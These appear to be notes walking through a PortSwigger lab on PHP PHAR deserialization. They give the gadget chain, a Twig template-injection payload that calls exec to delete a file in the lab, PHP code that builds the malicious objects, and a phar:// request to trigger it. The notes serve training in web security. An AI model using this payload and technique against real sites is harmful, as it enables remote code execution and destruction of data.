
1. Access the following path and verify the content;

![](Pasted_image_20231210213254.png)

> Remember to add the ~ at the end of the endpoint;

2. Study the source code and identify the gadget chain involving the `Blog->desc` and `CustomTemplate->lockFilePath` attributes.

3. Notice that the website uses the Twig template engine. You can use deserialization to pass in an [server-side template injection](https://portswigger.net/web-security/server-side-template-injection) (SSTI) payload. Find a documented SSTI payload for remote code execution on Twig, and adapt it to delete Carlos's file:
    
    `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}`
4. Write a some PHP for creating a `CustomTemplate` and `Blog` containing your SSTI payload:
    
    `class CustomTemplate {} class Blog {} $object = new CustomTemplate; $blog = new Blog; $blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}'; $blog->user = 'user'; $object->template_file_path = $blog;`
5. Create a `PHAR-JPG` polyglot containing your PHP script. You can find several scripts for doing this online (search for "`phar jpg polyglot`"). Alternatively, you can download from PortSwigger [ready-made one](https://github.com/PortSwigger/serialization-examples/blob/master/php/phar-jpg-polyglot.jpg).
6. Upload this file as your avatar.
7. In Burp Repeater, modify the request line to deserialize your malicious avatar using a `phar://` stream as follows:
    
    `GET /cgi-bin/avatar.php?avatar=phar://wiener`

![](Pasted_image_20231210213749.png)

